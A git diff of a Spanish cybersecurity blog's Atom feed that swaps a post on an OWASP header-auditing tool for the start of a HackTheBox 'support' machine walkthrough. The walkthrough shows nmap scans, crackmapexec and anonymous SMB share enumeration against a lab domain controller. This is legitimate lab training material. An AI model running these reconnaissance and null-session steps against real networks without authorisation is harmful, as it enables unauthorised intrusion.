@@ -1,210 +1,661 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-03-11T22:59:47-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Bast1ant1c</title><subtitle>Blog de Ciberseguridad</subtitle><author><name>BAST1ANT1C</name></author><entry><title type="html">SafeWebHeaders.py</title><link href="http://localhost:4000/safewebheaders/" rel="alternate" type="text/html" title="SafeWebHeaders.py" /><published>2023-03-10T00:00:00-05:00</published><updated>2023-03-10T00:00:00-05:00</updated><id>http://localhost:4000/safewebheaders</id><content type="html" xml:base="http://localhost:4000/safewebheaders/">&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/safewebheaders/02-tarjeta.png&quot; /&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-03-15T18:49:07-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Bast1ant1c</title><subtitle>Blog de Ciberseguridad</subtitle><author><name>BAST1ANT1C</name></author><entry><title type="html">HTB support AD</title><link href="http://localhost:4000/support/" rel="alternate" type="text/html" title="HTB support AD" /><published>2023-03-15T00:00:00-05:00</published><updated>2023-03-15T00:00:00-05:00</updated><id>http://localhost:4000/support</id><content type="html" xml:base="http://localhost:4000/support/">&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/support/02-tarjeta.png&quot; /&gt;
 &lt;/p&gt;
 
-&lt;p&gt;¡Hola! En esta ocasión vamos a conocer la utilidad &lt;a href=&quot;https://raw.githubusercontent.com/Thegame008/Secure-Headers-OWASP/main/SafeWebHeaders.py&quot;&gt;SafeWebHeaders.py&lt;/a&gt; creada por &lt;a href=&quot;https://github.com/Thegame008/&quot;&gt;The Game 008&lt;/a&gt;, para auditar las cabeceras de una pagina web basada en las recomendaciones de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OWASP&lt;/code&gt; (Open Web Application Security Project).&lt;/p&gt;
+&lt;p&gt;¡Hola!
+En esta ocasión vamos a resolver de la máquina &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;support&lt;/code&gt; AD de &lt;a href=&quot;https://hackthebox.com/&quot;&gt;HackTheBox&lt;/a&gt;.
+La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, al enfrentar estos retos, ¡vamos a ponernos hack!&lt;/p&gt;
 
-&lt;h2 id=&quot;cabeceras-web&quot;&gt;CABECERAS WEB&lt;/h2&gt;
+&lt;h2 id=&quot;preparación&quot;&gt;PREPARACIÓN&lt;/h2&gt;
 
-&lt;p&gt;Las cabeceras web, son parte de los datos que se envían desde un servidor web al cliente en una respuesta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt;. Estas cabeceras &lt;strong&gt;pueden&lt;/strong&gt; contienen información adicional sobre la respuesta, incluyendo información sobre el servidor, la caché, el tipo de contenido, la codificación de caracteres, entre otros. Estas son indispensables porque permiten que los navegadores web y otros clientes logren procesar la respuesta del servidor y representar la información al usuario final.&lt;/p&gt;
+&lt;p&gt;Para iniciar nuestra máquina, vamos a crear con nuestra función &lt;a href=&quot;https://bast1ant1c.github.io/mkhack/&quot;&gt;mkhack&lt;/a&gt; un directorio de trabajo con el nombre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;support&lt;/code&gt; y los subdirectorios &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;recon&lt;/code&gt; junto con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploit&lt;/code&gt;, con el objetivo de organizar la información que recopilemos en la realización de la máquina.&lt;/p&gt;
 
-&lt;p&gt;Algunos de los riesgos que se pueden presentar a nivel de seguridad en cabeceras son las siguientes:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Divulgación de información&lt;/li&gt;
-  &lt;li&gt;Inyecciones de código&lt;/li&gt;
-  &lt;li&gt;Secuestros de sesiones o clicks (hijacking)&lt;/li&gt;
-  &lt;li&gt;Exposición de información confidencial&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/safewebheaders/03-header.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;h2 id=&quot;owasp&quot;&gt;OWASP&lt;/h2&gt;
-
-&lt;p&gt;&lt;strong&gt;Open Web Application Security Project&lt;/strong&gt; es una organización sin ánimo de lucro con el objetivo de mejorar la seguridad del software y las aplicaciones web. Gracias a esto se han podido identificar los riesgos de seguridad más críticos y comunes a nivel &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;web&lt;/code&gt; y han proporcionado recursos y recomendaciones para ayudar a las comunidades a proteger sus aplicativos y páginas web.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/safewebheaders/04-header.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;OWASP tiene una lista de los &lt;a href=&quot;https://owasp.org/www-project-top-ten/&quot;&gt;diez riesgos de seguridad más críticos en aplicaciones web&lt;/a&gt;, conocida como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OWASP Top Ten&lt;/code&gt;. Entre este top se encuentra la falta de protección adecuada en las cabeceras web.&lt;/p&gt;
-
-&lt;p&gt;A continuación, las &lt;strong&gt;recomendaciones&lt;/strong&gt; proporcionadas por OWASP para mejorar la seguridad de las aplicaciones web:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Strict-Transport-Security (HSTS)&lt;/code&gt; que obliga al navegador a utilizar solo HTTPS para las solicitudes futuras a la misma dirección web&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;X-Frame-Options&lt;/code&gt; que evita la incrustación no deseada de páginas web en un marco (frame) y ayuda a prevenir el clickjacking&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;X-XSS-Protection&lt;/code&gt; que activa una protección integrada contra ataques XSS (Cross-Site Scripting) en los navegadores modernos&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;X-Content-Type-Options&lt;/code&gt; que evita la interpretación automática del contenido cargado para prevenir ataques MIME sniffing&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Security-Policy&lt;/code&gt; que limita los recursos que un sitio web puede cargar en su página, lo que ayuda a prevenir los ataques de inyección de código&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;instalar-safewebheaderspy&quot;&gt;INSTALAR SafeWebHeaders.py&lt;/h2&gt;
-
-&lt;p&gt;En el &lt;a href=&quot;https://github.com/Thegame008/Secure-Headers-OWASP&quot;&gt;repositorio&lt;/a&gt; puedes encontrar el paso a paso de como instalar la herramienta, sin embargo, acá tambien te mostramos el proceso.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/Thegame008/Secure-Headers-OWASP.git
-&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;Secure-Headers-OWASP
-python3 SafeWebHeaders.py
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mkhack support
+&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$/&lt;/span&gt;recon
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/safewebheaders/06-virtual.png&quot; /&gt;
-&lt;/p&gt;
+&lt;h2 id=&quot;reconocimiento&quot;&gt;RECONOCIMIENTO&lt;/h2&gt;
 
-&lt;h2 id=&quot;safewebheaderspy-en-acción&quot;&gt;SafeWebHeaders.py EN ACCIÓN&lt;/h2&gt;
+&lt;p&gt;Accedemos al directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;recon&lt;/code&gt; e iniciamos nuestra fase de reconocimiento sobre el objetivo por medio de nuestra utilidad &lt;a href=&quot;https://bast1ant1c.github.io/osping/&quot;&gt;osping&lt;/a&gt; detectando el tipo de sistema operativo basado en el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ttl&lt;/code&gt; &lt;em&gt;time to live&lt;/em&gt; de una traza &lt;strong&gt;ICMP&lt;/strong&gt;.&lt;/p&gt;
 
-&lt;p&gt;Luego de instalar la herramienta, vamos a hacer una prueba para ver que tan seguro es nuestro blog a nivel &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;web&lt;/code&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 SafeWebHeaders.py
-Introduce la URL a escanear: https://bast1ant1c.github.io
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;osping 10.10.11.174
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Cabeceras correctamente implementadas:
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Detectando sistema operativo ...
 
-Cabeceras con configuración incorrecta:
-- Strict-Transport-Security:
-	- Valor recomendado por OWASP: max-age&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;63072000&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; includeSubDomains&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; preload
-	- Configuración actual en la URL: max-age&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;31556952
-	- Riesgo: Vulnerabilidad a ataques de MITM
-
-Cabeceras que deberían estar implementadas, pero no se ven implementadas:
-- X-Frame-Options: SAMEORIGIN
-- X-XSS-Protection: 1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;block
-- X-Content-Type-Options: nosniff
-- Content-Security-Policy: default-src &lt;span class=&quot;s1&quot;&gt;'self'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; base-uri &lt;span class=&quot;s1&quot;&gt;'self'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; img-src &lt;span class=&quot;s1&quot;&gt;'self'&lt;/span&gt; data:&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; object-src &lt;span class=&quot;s1&quot;&gt;'none'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; script-src &lt;span class=&quot;s1&quot;&gt;'self'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; style-src &lt;span class=&quot;s1&quot;&gt;'self'&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'unsafe-inline'&lt;/span&gt;
-
-Divulgación de información en cabecera:
-- Server: GitHub.com
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] 10.10.11.174 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;127 &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; Windows
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Como podemos evidenciar, esta utilidad nos permite identificar cabeceras correctamente implementadas, con configuración incorrecta, no implementadas y divulgación de información sensible, en esta oportunidad podemos ver que nuestro blog necesita un ajuste a nivel de cabeceras para que sea un sitio seguro.&lt;/p&gt;
+&lt;p&gt;Identificamos que es una maquina &lt;strong&gt;Windows&lt;/strong&gt; debido a su ttl (time to live) correspondiente a 127 (Disminuye en 1 debido a que realiza un salto adicional en el entorno de HackTHeBox).&lt;/p&gt;
 
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/safewebheaders/05-virtual.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;h2 id=&quot;configuración-máquina-1&quot;&gt;CONFIGURACIÓN MÁQUINA 1&lt;/h2&gt;
-
-&lt;p&gt;Nuestra primera máquina tendrá conexión directa con la interfaz física, por lo tanto, solo requerimos de un adaptador de red en adaptador puente.&lt;/p&gt;
 &lt;blockquote&gt;
 
   &lt;ul&gt;
-    &lt;li&gt;Clic en la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;máquina&lt;/code&gt;&lt;/li&gt;
-    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Configuración&lt;/code&gt;&lt;/li&gt;
-    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Red&lt;/code&gt;&lt;/li&gt;
-    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Adaptador 1&lt;/code&gt;&lt;/li&gt;
-    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Enable Network Adapter&lt;/code&gt;&lt;/li&gt;
-    &lt;li&gt;Escoger &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Adaptador puente&lt;/code&gt;&lt;/li&gt;
-    &lt;li&gt;Escoger &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Interfaz&lt;/code&gt; física&lt;/li&gt;
-    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Aceptar&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;TTL =&amp;gt; 64	Linux&lt;/li&gt;
+    &lt;li&gt;TTL =&amp;gt; 128	Windows&lt;/li&gt;
   &lt;/ul&gt;
 
 &lt;/blockquote&gt;
 
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/safewebheaders/08-virtual.png&quot; /&gt;
-&lt;/p&gt;
+&lt;p&gt;Continuamos con la enumeración de los &lt;strong&gt;65535&lt;/strong&gt; puertos en la máquina.&lt;/p&gt;
 
-&lt;h2 id=&quot;configuración-máquina-2&quot;&gt;CONFIGURACIÓN MÁQUINA 2&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.11.174 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; ports | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;open
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+49664/tcp open  unknown
+49668/tcp open  unknown
+49674/tcp open  unknown
+49684/tcp open  unknown
+49700/tcp open  unknown
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Nuestra segunda máquina tendrá la misma conexión con adaptador puente y otro adaptador de red para la nueva interfaz configurada anteriormente.&lt;/p&gt;
+&lt;p&gt;Luego de identificar los puertos abiertos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OPEN&lt;/code&gt;, se procede a escanear servicios y versiones que puedan estar en nuestro objetivo.&lt;/p&gt;
 
-&lt;h3 id=&quot;configuración-interfaz-puente&quot;&gt;CONFIGURACIÓN INTERFAZ PUENTE&lt;/h3&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p53&lt;/span&gt;,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49668,49674,49684,49700 &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.11.174 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; versions
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;server &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 2023-02-18 02:11:10Z&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: support.htb0., Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: support.htb0., Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp  open  mc-nmf        .NET Message Framing
+49664/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49684/tcp open  msrpc         Microsoft Windows RPC
+49700/tcp open  msrpc         Microsoft Windows RPC
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;ad-domain-detection&quot;&gt;AD DOMAIN DETECTION&lt;/h2&gt;
+
+&lt;p&gt;Iniciamos con la detección del &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dominio&lt;/code&gt; donde inicialmente, por medio de la utilidad &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;crackmapexec&lt;/code&gt; enumeramos información necesaria para tener un mejor alcance a la máquina víctima.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;crackmapexec smb 10.10.11.174
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SMB         10.10.11.174    445    DC               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10.0 Build 20348 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:DC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:support.htb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Agregamos en el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;su
+nvim /etc/hosts
+10.10.11.174  DC DC.support.htb support.htb
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;smb-null-session-enum&quot;&gt;SMB NULL SESSION ENUM&lt;/h2&gt;
+
+&lt;p&gt;Eumeramos información por smb null session&lt;/p&gt;
+
+&lt;h3 id=&quot;crackmapexec&quot;&gt;CRACKMAPEXEC&lt;/h3&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;crackmapexec smb 10.10.11.174 &lt;span class=&quot;nt&quot;&gt;--shares&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SMB         10.10.11.174    445    DC               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10.0 Build 20348 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:DC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:support.htb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+SMB         10.10.11.174    445    DC               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] Error enumerating shares: SMB SessionError: STATUS_USER_SESSION_DELETED&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;The remote user session has been deleted.&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;smbclient--n&quot;&gt;SMBCLIENT -N&lt;/h3&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbclient &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; 10.10.11.174 &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	Sharename       Type      Comment
+	&lt;span class=&quot;nt&quot;&gt;---------&lt;/span&gt;       &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;      &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
+	ADMIN&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;         Disk      Remote Admin
+	C&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;             Disk      Default share
+	IPC&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;           IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	support-tools   Disk      support staff tools
+	SYSVOL          Disk      Logon server share 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;smbmap--u-&quot;&gt;SMBMAP -U ‘’&lt;/h3&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbmap &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; 10.10.11.174 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] IP: 10.10.11.174:445	Name: DC                                                
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;smbmap--u-null&quot;&gt;SMBMAP -U ‘NULL’&lt;/h3&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbmap &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; 10.10.11.174 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'null'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Guest session   	IP: 10.10.11.174:445	Name: DC                                                
+	Disk                                                  	Permissions	Comment
+	&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                  	&lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;	&lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
+	ADMIN&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                           	NO ACCESS	Remote Admin
+	C&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                               	NO ACCESS	Default share
+	IPC&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                             	READ ONLY	Remote IPC
+	NETLOGON                                          	NO ACCESS	Logon server share 
+	support-tools                                     	READ ONLY	support staff tools
+	SYSVOL                                            	NO ACCESS	Logon server share 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;archivo-userinfoexezip&quot;&gt;ARCHIVO USERINFO.EXE.ZIP&lt;/h2&gt;
+
+&lt;p&gt;En los recursos compartidos tenemos la oportunidad de ver un archivo interesante, por lo que procedemos a traerlo a nuestra máquina&lt;/p&gt;
+
+&lt;h3 id=&quot;acceso-a-smb&quot;&gt;ACCESO A SMB&lt;/h3&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbclient //10.10.11.174/support-tools &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
